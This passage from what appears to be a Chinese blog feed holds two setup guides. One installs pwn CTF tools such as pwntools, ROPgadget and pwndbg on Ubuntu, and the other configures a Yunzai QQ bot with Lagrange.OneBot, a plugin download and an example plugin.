<li><p><strong>安装 <code>python3-venv</code> 和 <code>python3-pip</code></strong>： 首先，确保你已经安装了 <code>python3-venv</code> 和 <code>python3-pip</code>，这些工具允许你创建虚拟环境并安装 pip 包。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install python3-venv python3-pip</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>创建虚拟环境</strong>： 创建一个新的虚拟环境，用来安装和管理 <code>pwntools</code>。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m venv pwnenv</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>激活虚拟环境</strong>： 激活虚拟环境，这样你就可以在隔离的环境中安装 Python 包了。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> pwnenv/bin/activate</span><br></pre></td></tr></table></figure></div>
<p>激活后，你会看到命令提示符前面会加上 <code>(pwnenv)</code>，表示你已经进入虚拟环境。</p>
</li>
<li><p><strong>安装 <code>pwntools</code></strong>： 在虚拟环境中，你可以使用 <code>pip</code> 安装 <code>pwntools</code> 和其他需要的 Python 包。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>退出虚拟环境</strong>： 使用完虚拟环境后，可以通过以下命令退出：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure></div>
</li>
</ol>
<p><strong>使用 <code>pipx</code>（可选）</strong></p>
<p>如果不想每次都手动激活虚拟环境，可以考虑使用 <code>pipx</code> 来管理独立的 Python 应用程序。<code>pipx</code> 会自动为我们创建虚拟环境并管理依赖。</p>
<ol>
<li><p><strong>安装 <code>pipx</code></strong>：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install pipx</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>使用 <code>pipx</code> 安装 <code>pwntools</code></strong>：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pipx install pwntools</span><br></pre></td></tr></table></figure></div>
</li>
</ol>
<p><code>pipx</code> 会自动为你创建一个虚拟环境，并在其中安装 <code>pwntools</code>，你可以直接运行它，而无需手动管理虚拟环境。</p>
<p>但这个pipx亲测太慢了！！！不推荐。</p>
<h3 id="4-安装-ROPgadget"><a href="#4-安装-ROPgadget" class="headerlink" title="4. 安装 ROPgadget"></a>4. 安装 ROPgadget</h3><p><code>ROPgadget</code> 是一个用于查找 ROP 链 gadget 的工具：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install ropgadget</span><br></pre></td></tr></table></figure></div>
<h3 id="5-安装-seccomp-tools"><a href="#5-安装-seccomp-tools" class="headerlink" title="5. 安装 seccomp-tools"></a>5. 安装 seccomp-tools</h3><p><code>seccomp-tools</code> 用于分析和利用 seccomp 过滤器：</p>
<p>安装 Ruby 和 RubyGems</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install -y ruby-full</span><br></pre></td></tr></table></figure></div>
<p>使用 RubyGems 安装 <code>seccomp-tools</code></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> gem install seccomp-tools</span><br></pre></td></tr></table></figure></div>
<p>安装完成后，可以通过以下命令验证安装是否成功：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">seccomp-tools --version</span><br></pre></td></tr></table></figure></div>
<h3 id="6-安装-glibc-all-in-one"><a href="#6-安装-glibc-all-in-one" class="headerlink" title="6. 安装 glibc-all-in-one"></a>6. 安装 glibc-all-in-one</h3><p><code>glibc-all-in-one</code> 包含了不同版本的 glibc，方便进行漏洞测试：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> git <span class="built_in">clone</span> https://github.com/matrix1001/glibc-all-in-one.git</span><br><span class="line"><span class="built_in">cd</span> glibc-all-in-one/</span><br><span class="line"><span class="built_in">sudo</span> python3 update_list</span><br></pre></td></tr></table></figure></div>
<h3 id="7-安装patchelf"><a href="#7-安装patchelf" class="headerlink" title="7. 安装patchelf"></a>7. 安装patchelf</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/NixOS/patchelf.git</span><br><span class="line"><span class="built_in">cd</span> patchelf</span><br><span class="line">./bootstrap.sh </span><br></pre></td></tr></table></figure></div>
<p>若显示报错</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/24/%E5%BF%AB%E9%80%9F%E5%9C%A824-04Ubuntu%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20241209231226259.png"
                      class=""
                >
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install autoconf automake libtool</span><br><span class="line">./bootstrap.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make check</span><br><span class="line"><span class="built_in">sudo</span> make install</span><br></pre></td></tr></table></figure></div>
<h3 id="8-安装-pwndbg"><a href="#8-安装-pwndbg" class="headerlink" title="8. 安装 pwndbg"></a>8. 安装 pwndbg</h3><p><code>pwndbg</code> 是一个为 GDB 提供增强功能的插件，它对调试 PWN 题目非常有用：</p>
<p>装的时候记得先切到之前建立的虚拟环境。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg</span><br><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure></div>
<p>若产生如下错误，则有可能是网络连接的问题（具体的可以看日志文件）。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/24/%E5%BF%AB%E9%80%9F%E5%9C%A824-04Ubuntu%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20241209233456670.png"
                      class=""
                >
<p>可以配置镜像源加速</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p ~/.pip</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[global]</span></span><br><span class="line"><span class="string">index-url = https://pypi.tuna.tsinghua.edu.cn/simple&quot;</span> &gt; ~/.pip/pip.conf</span><br></pre></td></tr></table></figure></div>
<h3 id="8-安装-one-gadget"><a href="#8-安装-one-gadget" class="headerlink" title="8. 安装 one_gadget"></a>8. 安装 one_gadget</h3><p><code>one_gadget</code> 是一个用来快速查找 libc 中单次调用的 RCE gadget 的工具：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gem install one_gadget</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>env</tag>
      </tags>
  </entry>
  <entry>
    <title>云崽bot基础搭建过程记录</title>
    <url>/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="云崽bot基础搭建过程记录"><a href="#云崽bot基础搭建过程记录" class="headerlink" title="云崽bot基础搭建过程记录"></a>云崽bot基础搭建过程记录</h2><p>突发奇想想要搭建一个qqbot玩玩，经同学推荐，准备从最简单的yunzai框架入手。</p>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><blockquote>
<p>环境准备：Windows/Linux/MacOS/Android<br><a class="link"   href="https://nodejs.org/" >Node.js(&gt;=v21)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, <a class="link"   href="https://redis.io/" >Redis<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, <a class="link"   href="https://git-scm.com/" >Git<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</blockquote>
<h5 id="redis安装"><a href="#redis安装" class="headerlink" title="redis安装"></a>redis安装</h5><ul>
<li><p>下载地址<a class="link"   href="https://gitee.com/link?target=https%3A%2F%2Fwwrl.lanzouw.com%2Fiml4v0xwo0za" >redis<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>,密码:114514</p>
</li>
<li><p>解压后启动redis-server.exe这个文件。</p>
</li>
<li><p>将redis-server.exe所在的目录添加进环境变量，这样yunzai启动时会自动找到redis并启动</p>
</li>
</ul>
<h5 id="nodejs安装"><a href="#nodejs安装" class="headerlink" title="nodejs安装"></a>nodejs安装</h5><p><a class="link"   href="https://nodejs.cn/download/" >nodejs中文网<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<ul>
<li>windows操作系统的话直接下64位msi文件一键安装就行了</li>
<li>linux的话下下来是一个<code>.tar.xz</code>文件，<code>tar -xvf xxx.tar.xz</code>就能够解压出来，然后把<code>./bin/</code>目录放到环境变量里去就行，<code>export PATH=/path/to/node-v20.18.0-linux-x64/bin:$PATH</code>，不想每次都重新设置环境变量就直接在<code>~/.bashrc</code>中加这一行命令</li>
</ul>
<h5 id="git安装"><a href="#git安装" class="headerlink" title="git安装"></a>git安装</h5><ul>
<li>windows：<a class="link"   href="https://git-scm.com/downloads/win" >https://git-scm.com/downloads/win<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li>linux：<code>sudo apt update | sudo apt install git</code></li>
</ul>
<h5 id="yunzai本体安装"><a href="#yunzai本体安装" class="headerlink" title="yunzai本体安装"></a>yunzai本体安装</h5><p>有了如上几个必选项后</p>
<div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">git clone --depth <span class="number">1</span> https://gitee.com/TimeRainStarSky/Yunzai</span><br><span class="line"><span class="built_in">cd</span> Yunzai</span><br></pre></td></tr></table></figure></div>
<h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><p>在yunzai目录下启动：</p>
<div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">node .</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241124135258312.png"
                      class=""
                >
<h4 id="启动协议端"><a href="#启动协议端" class="headerlink" title="启动协议端"></a>启动协议端</h4><p>“协议端” 是指实现 QQ 通信协议的服务组件。不同的协议端提供了不同的功能和适配方式，例如：</p>
<ul>
<li><strong>OneBot v11</strong>：支持标准化的 OneBot 协议，可以与多种第三方服务交互。</li>
<li><strong>ComWeChat</strong>：通过仿 QQ 客户端的方式实现通信。</li>
<li><strong>GSUIDCore</strong> 和 <strong>OPQBot</strong>：各自提供不同的兼容特性和扩展。</li>
</ul>
<p>这些协议端负责处理与 QQ 的连接（包括登录、消息收发等），为机器人提供基础的通信能力。</p>
<p>启动协议端的目的是：</p>
<ul>
<li>连接到 QQ 服务器并登录指定的 QQ 账号。</li>
<li>监听来自 QQ 的消息（例如群聊消息、私聊消息等）。</li>
<li>转发消息到 Yunzai-Bot 的核心逻辑，进行处理。</li>
<li>将 Yunzai-Bot 处理后的响应结果（如回复消息）发送回 QQ。</li>
</ul>
<h4 id="账号绑定"><a href="#账号绑定" class="headerlink" title="账号绑定"></a>账号绑定</h4><h5 id="协议端绑定"><a href="#协议端绑定" class="headerlink" title="协议端绑定"></a>协议端绑定</h5><p>我们选用OneBotv11作为协议端，下载并运行<code>Lagrange.OneBot</code>后改配置，这里实际上是配置了一个反向 WebSocket 连接，而在<code>yunzai/config/config/bot.yaml</code>中实际有指定服务器开放的端口为2536，所以我们要在协议端开放2536端口。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125003714736.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125003412271.png"
                      class=""
                >
<p>修改过后大概长这样：</p>
<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Logging&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;LogLevel&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Default&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Information&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Microsoft&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Warning&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Microsoft.Hosting.Lifetime&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Information&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;SignServerUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span>	</span><br><span class="line">    <span class="attr">&quot;SignProxyUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;MusicSignServerUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Account&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Uin&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Protocol&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Linux&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;AutoReconnect&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;GetOptimumServer&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Message&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;IgnoreSelf&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;StringPost&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;QrCode&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;ConsoleCompatibilityMode&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Implementations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ReverseWebSocket&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Port&quot;</span><span class="punctuation">:</span> <span class="number">2536</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Suffix&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/OneBotv11&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;ReconnectInterval&quot;</span><span class="punctuation">:</span> <span class="number">5000</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;HeartBeatInterval&quot;</span><span class="punctuation">:</span> <span class="number">5000</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;AccessToken&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
<p>其中<code>Lagrange.OneBot</code>在配置改完后按任意键继续时，会出现一个二维码。这时我们拿自己的qq小号(bot)扫码就可以登录进去了。之后我们在yunzai的主程序中就看到了连接建立</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125004337786.png"
                      class=""
                >
<p>但有时候登录时会显示需要Captcha认证，需要输入<code>ticket</code>和<code>token</code>，这时候我们需要到提供的网址处去手动验证，并抓包查看对应的<code>ticket</code>和<code>token</code>。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125142132940.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125142205096.png"
                      class=""
                >
<p>然后可以分别输入ticket和token。之后如果还是显示安全风险无法登录，可以在<code>appsettings.json</code>中加入<code>&quot;SignServerUrl&quot;: &quot;https://sign.lagrangecore.org/api/sign/25765&quot;</code>这么一条配置，用来获取签名。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125141307897.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125141648698.png"
                      class=""
                >
<p>如果还是显示安全风险，可以到<a class="link"   href="https://lagrangedev.github.io/LagrangeGo/guide/sign" >签名服务器文档<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>中找一个别的签名服务器换上。实在不行，可以把当前目录下除了<code>Lagrange.OneBot.exe</code>和<code>appsettings.json</code>全部删除了重新启动。</p>
<h5 id="设置主人"><a href="#设置主人" class="headerlink" title="设置主人"></a>设置主人</h5><p>之后我们发现<code>yunzai/plugins/example</code>中有个<code>主动复读.js</code>文件，里面实现的内容就是匹配到<code>#复读</code>就进行复读，可以用来进行测试。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125143521393.png"
                      class=""
                >
<p>然后就给bot私发#设置主人就能够获取权限。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125144021413.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125144452592.png"
                      class=""
                >
<p>当然也可以直接改<code>yunzai/config/config/other.yaml</code>中的masterQQ以及master进行配置。其中master的格式是</p>
<p><code>bot qq:master qq</code>。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125144941477.png"
                      class=""
                >
<h4 id="插件安装"><a href="#插件安装" class="headerlink" title="插件安装"></a>插件安装</h4><p><a class="link"   href="https://gitee.com/yhArcadia/Yunzai-Bot-plugins-index" >插件大全<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>插件里提供了各式不同类型的功能，在yunzai bot运行时，会自动加载<code>yunzai/plugins</code>目录下的各个插件目录。</p>
<p>新的插件可以自己进行编写，存在插件目录下，也可以github和gitee上找新插件下载，大体有以下几种方式进行安装。</p>
<h5 id="自带指令"><a href="#自带指令" class="headerlink" title="自带指令"></a>自带指令</h5><p>一般能装一些最常用的插件</p>
<div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">#安装TRSS-Plugin</span><br></pre></td></tr></table></figure></div>
<h5 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h5><p>可以方便下载gitee上一些插件</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -o &quot;./plugins/example/定时群发.js&quot; &quot;https://gitee.com/batvbs/Miao-Yunzai-batvbs/raw/master/定时群发.js&quot;</span><br></pre></td></tr></table></figure></div>
<h4 id="基础功能测试及编写"><a href="#基础功能测试及编写" class="headerlink" title="基础功能测试及编写"></a>基础功能测试及编写</h4><p>以<code>./plugin/example</code>目录下的<code>主动复读.js</code>为例</p>
<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">example2</span> <span class="keyword">extends</span> <span class="title class_ inherited__">plugin</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(&#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;复读&quot;</span>,</span><br><span class="line">      <span class="attr">dsc</span>: <span class="string">&quot;复读用户发送的内容，然后撤回&quot;</span>,</span><br><span class="line">      <span class="comment">/** https://oicqjs.github.io/oicq/#events */</span></span><br><span class="line">      <span class="attr">event</span>: <span class="string">&quot;message&quot;</span>,</span><br><span class="line">      <span class="attr">priority</span>: <span class="number">5000</span>,</span><br><span class="line">      <span class="attr">rule</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/** 命令正则匹配 */</span></span><br><span class="line">          <span class="attr">reg</span>: <span class="string">&quot;^#复读$&quot;</span>,</span><br><span class="line">          <span class="comment">/** 执行方法 */</span></span><br><span class="line">          <span class="attr">fnc</span>: <span class="string">&quot;repeat&quot;</span>,</span><br><span class="line">          <span class="attr">permission</span>: <span class="string">&quot;master&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** 复读 */</span></span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">repeat</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">/** 设置上下文，后续接收到内容会执行doRep方法 */</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setContext</span>(<span class="string">&quot;doRep&quot;</span>)</span><br><span class="line">    <span class="comment">/** 回复 */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">reply</span>(<span class="string">&quot;请发送要复读的内容&quot;</span>, <span class="literal">false</span>, &#123; <span class="attr">at</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** 接受内容 */</span></span><br><span class="line">  <span class="title function_">doRep</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">/** 结束上下文 */</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">finish</span>(<span class="string">&quot;doRep&quot;</span>)</span><br><span class="line">    <span class="comment">/** 复读内容 */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">reply</span>(<span class="variable language_">this</span>.<span class="property">e</span>.<span class="property">message</span>, <span class="literal">false</span>, &#123; <span class="attr">recallMsg</span>: <span class="number">5</span> &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>首先是继承了plugin父类。各个参数的含义见注释。</p>
<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">class</span> <span class="title class_">plugin</span> &#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> name 插件名称</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> dsc 插件描述</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> handler handler配置</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> handler.key handler支持的事件key</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> handler.fn handler的处理func</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> namespace namespace，设置handler时建议设置</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> event 执行事件，默认message</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> priority 优先级，数字越小优先级越高</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> <span class="variable">rule</span></span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> rule.reg 命令正则</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> rule.fnc 命令执行方法</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> rule.event 执行事件，默认message</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> rule.log  false时不显示执行日志</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> rule.permission 权限 master,owner,admin,all</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> <span class="variable">task</span></span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> task.name 定时任务名称</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> task.cron 定时任务cron表达式</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> task.fnc 定时任务方法名</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> task.log  false时不显示执行日志</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">&#123;</span></span><br><span class="line"><span class="params">    name = <span class="string">&quot;your-plugin&quot;</span>,</span></span><br><span class="line"><span class="params">    dsc = <span class="string">&quot;无&quot;</span>,</span></span><br><span class="line"><span class="params">    handler,</span></span><br><span class="line"><span class="params">    namespace,</span></span><br><span class="line"><span class="params">    event = <span class="string">&quot;message&quot;</span>,</span></span><br><span class="line"><span class="params">    priority = <span class="number">5000</span>,</span></span><br><span class="line"><span class="params">    task = &#123; name: <span class="string">&quot;&quot;</span>, fnc: <span class="string">&quot;&quot;</span>, cron: <span class="string">&quot;&quot;</span> &#125;,</span></span><br><span class="line"><span class="params">    rule = []</span></span><br><span class="line"><span class="params">  &#125;</span>)</span><br><span class="line">  ........</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> msg 发送的消息</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> quote 是否引用回复</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> data.recallMsg 